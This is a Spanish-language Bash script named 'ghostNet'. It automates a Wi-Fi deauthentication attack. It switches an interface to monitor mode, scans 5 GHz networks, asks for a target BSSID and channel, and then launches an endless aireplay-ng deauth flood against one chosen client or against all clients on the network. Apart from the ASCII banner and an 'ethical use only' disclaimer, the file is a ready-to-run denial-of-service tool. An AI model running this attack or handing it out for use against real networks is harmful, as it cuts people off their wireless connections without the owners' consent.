#!/usr/bin/env bash

# Limpiamos la terminal
clear

# Colores (gracias s4vitar)
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Control + C (salir del programa)
trap ctrl_c INT

function ctrl_c(){
  echo -e "${redColour}[!] Saliendo...${endColour}"  
  rm monitoreo.txt redes.txt interfaces
  sudo airmon-ng stop $mon_interfaz > /dev/null 2>&1
  tput cnorm; exit 1;
}

# Mensaje de bienvenida (se que es larguisimo XD)
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠴⠶⠶⠶⠶⠶⠶⠶⢤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠶⠞⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⢶⣦⡤⢤⣤⣀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠟⠋⣁⡤⠴⠶⠶⢦⣄⣀⣀⣀⣀⡀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠈⢻⡆⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⣠⡶⢋⡥⠒⠛⠉⠙⠛⠓⠲⠦⢤⣀⠉⠻⢿⡟⢿⡛⠛⠛⠛⠿⠶⣦⣤⣀⡀⠀⢠⡿⠁⠀⡀⢠⣼⠇⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⣠⠞⠁⣠⠎⢠⣶⣶⣶⠦⢤⣀⠀⠀⠀⠀⢭⡀⡀⠙⠂⠙⢄⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣁⣀⣴⣷⣿⡏⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⣠⠞⢡⣿⡾⣿⠀⣾⠟⡋⠀⠀⠀⠙⢷⣦⣄⠀⠀⠙⢾⣆⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⠀⠀⢨⠋⠛⣿⣿⡟⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⡔⢁⣴⠟⠁⠀⡏⢸⣏⡎⠀⠀⠀⠀⠀⠀⢹⣻⣷⣦⣄⠀⠙⢧⠀⠀⠀⠙⣦⡀⠀⠀⠀⠀⢀⠇⠀⢠⣿⡏⠀⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠌⡠⠊⠀⠀⠀⠀⡇⣾⢻⠀⠀⠀⠀⠀⠀⣸⡿⠋⢁⣀⠈⠳⣄⠀⠑⡀⠀⠀⢸⣷⡀⠀⠀⠀⡎⠀⢀⣾⡟⠀⠀⠀⠀⠀ghostNet by:${endColour}"
echo -e "${redColour}⡴⠊⠀⠀⠀⠀⠀⠀⠇⢹⢸⣷⣤⣤⣀⢀⣴⠏⢀⣴⠿⣿⣿⠀⣹⣦⠀⠈⢂⠀⠀⠙⣿⡄⠀⡜⠀⢠⣿⡿⠀⠀⠀⠀⠀⠀Ernesto Ramos (h4xthan)${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⢠⠘⡞⠁⠀⣀⢉⣹⣧⡤⠾⠿⠶⣿⡯⠞⢻⡟⣧⠀⢸⡄⠀⠀⡘⣿⡴⠁⢀⣾⡿⠁⠀⠀⠀⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⢸⢨⣷⣼⣿⣿⡟⠉⣿⣷⡄⠀⢀⣀⡤⢤⡿⢁⣿⣇⢸⣧⠀⠃⢸⣿⠃⠀⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⣿⣾⡙⠛⠋⠠⣿⡟⠻⠓⠀⠈⣠⣾⡇⢸⣿⣿⠀⣿⠀⡏⢸⠇⠀⣼⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⠸⣿⣿⣶⣆⡀⢀⣀⣀⣤⠴⢋⣟⡿⠁⢸⣿⣿⣾⡟⢀⣿⡞⢀⣼⣿⣧⣄⣀⡀⠀⠀⠀⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣧⠙⣿⣿⣿⣿⣭⡬⡤⣟⣿⢷⡿⢁⣴⣿⠟⣽⠋⠀⣸⡟⠀⢨⣿⣿⣿⣿⠟⠿⣦⡀⠀⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡜⢷⣌⢻⣿⣏⠙⣿⠿⠛⠛⡿⠀⣾⡿⢋⡼⠇⠀⠀⡿⠁⢀⣾⣿⣿⠀⠘⡄⠀⠀⠙⢦⡀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣮⣙⠷⣝⠻⣿⣁⣠⣗⣒⣱⣾⡟⢡⠎⠀⡇⠀⢠⠁⢀⣾⡟⠾⡇⠀⠀⠈⠀⠀⠀⠀⠹⣆⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣩⣿⣿⣿⣯⡻⣿⣿⣿⣿⡟⢠⡿⠀⠀⣇⢀⠆⢀⣼⡿⠁⠀⠇⠀⠀⡀⠀⢰⠀⠀⠀⢻⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠋⣿⢿⣿⣿⣿⣿⣍⠻⡿⢀⣿⡇⠀⢀⣿⡏⠀⢸⣿⠁⠀⠀⢀⠀⠀⢡⠀⠈⣆⠀⠀⢸⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠁⠀⠀⡟⢸⠹⣏⣿⣘⣿⣶⡇⣸⣿⡅⠀⢸⡟⠀⢠⣿⠃⠀⡇⠀⠘⣇⠀⠈⡆⠀⣿⣆⣸⣿⡀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⠀⣾⡿⢁⠀⡇⠀⠀⠇⠀⢀⣿⡿⠋⠙⠉⣷⣿⣿⣇⠀⡸⠀⣠⣿⢣⡇⠀⣷⠀⢀⣿⡀⠀⣿⡀⣿⣿⣿⡏⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⢸⡿⠃⢸⠀⣧⠀⣠⠴⠺⠋⡽⠁⢀⡾⣟⠛⠭⠉⢯⣴⣇⣼⣿⣿⣿⣷⣼⣿⣦⣾⣿⣷⣠⣿⣷⣿⡷⢿⣷⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⢸⠁⠀⡿⢰⣯⡴⠃⠀⠀⡼⠀⠀⣿⠁⠈⢧⡀⢶⣤⡿⢿⣿⣿⣿⣿⣿⢿⣿⣿⡏⣸⣿⣿⡟⠸⣿⡇⠀⠙⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⣬⡄⣸⣷⠋⢹⠃⠀⡄⠀⡀⠀⣠⣿⣀⠀⣘⣽⡞⠉⣷⣄⣹⣿⣿⣿⡇⠈⢻⣿⡀⠙⣿⣿⣷⠀⢿⣿⢠⡆⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⣿⢰⠟⠃⠀⡎⠀⢰⡇⠀⣄⢰⣿⣿⣿⠛⢻⣄⠱⣄⠈⢻⡟⢹⣿⣿⠿⡆⢈⣿⠃⢸⣿⣟⠁⢀⠀⠀⠈⠁⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⢰⣿⠏⢰⠁⢸⡀⠀⣾⣧⣴⣿⣿⡙⣿⣿⣆⠀⠙⢆⣨⣶⣫⠗⠻⣿⡏⠀⠃⠘⢻⡆⠀⢻⠏⠀⠘⠀⠀⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠸⠿⣦⣿⣄⣼⣷⣾⡏⠹⣿⢿⣯⢁⣹⣿⣿⣧⡠⢾⠧⠚⠀⠀⠀⠙⠃⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"
echo -e "${redColour}⠀⠀⠀⠀⠀⣄⢻⡏⠙⠹⠛⠿⠗⠀⠁⠈⠛⠀⠉⠉⠈⠉⠙⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${endColour}"

sleep 2; clear
echo -e "${yellowColour}[!]${endColour} ${purpleColour}Este script está pensado para ser utilizado solo con fines éticos y/o educativos.\nEste solo es un proyecto cuyo propósito es para demostrar las habilidades que he ido adquiriendo en el tiempo que llevo en este campo.\nPor lo tanto, no me hago responsable del mal uso que se le dé a este script.${endColour}"

# Mostramos las interfaces de red disponibles y guardamos la seleccion del usuario
for i in $(seq 1 80); do echo -ne "${redColour}-"; done; echo -ne "${endColour}"
  echo -e "\n[!] ${yellowColour}Selecciona una de las interfaces de red disponibles (escribe el nombre tal cual se muestra):${endColour}"
ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > interfaces

for interfaz in $(cat interfaces); do
  echo -e "\n${redColour}[+]${endColour} ${purpleColour}$interfaz${endColour}\n"
done
read eleccion

# Cambiamos al modo monitor en la interfaz elegida por el usuario
sudo airmon-ng start $eleccion > /dev/null 2>&1
echo -e "\n${redColour}[!]${endColour} ${purpleColour}Cambiando al modo monitor...${endColour}\n"
mon_interfaz=$(sudo airmon-ng | grep "Interface" -A 2 | tail -n 1 | awk 'NF{print $2}')
sleep 1

# Escaneamos las redes disponibles en la interfaz de red
echo -e "${redColour}[*]${endColour} ${purpleColour}Escaneando las redes disponibles...${endColour}"
sudo timeout 10 airodump-ng --band a $mon_interfaz > redes.txt
cat redes.txt | grep -v "Quitting..."

read -p "Introduce el BSSID objetivo: " bssid
read -p "Introduce el canal objetivo: " canal

# Monitoreamos la red que elegió el usuario
echo -e "${redColour}[!]${endColour} ${purpleColour}Monitoreando...${endColour}"
sudo timeout 10 airodump-ng --band a -c "$canal" --bssid "$bssid" "$mon_interfaz" > monitoreo.txt

# Preguntamos si se quiere desautenticar uno o todos los dispotivos que se encuentren conectados a la red
read -p "Quieres desautenticar a un dispositivo o a todos juntos? (uno/todos): " eleccion1
cat monitoreo.txt

if [ "$eleccion1" == "uno" ]; then
  read -p "Introduce la STATION del dispositivo: " station
  echo -e "${redColour}[!]Iniciando el ataque...${endColour}"
  sleep 1
  sudo aireplay-ng -0 0 -a $bssid -c $station $mon_interfaz
elif [ "$eleccion1" == "todos" ]; then
  echo -e "${redColour}[!] Iniciando el daño masivo mamonzón...${endColour}"
  sleep 1
  sudo aireplay-ng -0 0 -a $bssid $mon_interfaz
else
  echo -e "${purpleColour}[-]${endColour} ${blueColour}Opción no válida, saliendo...${endColour}"
  exit 1
fi

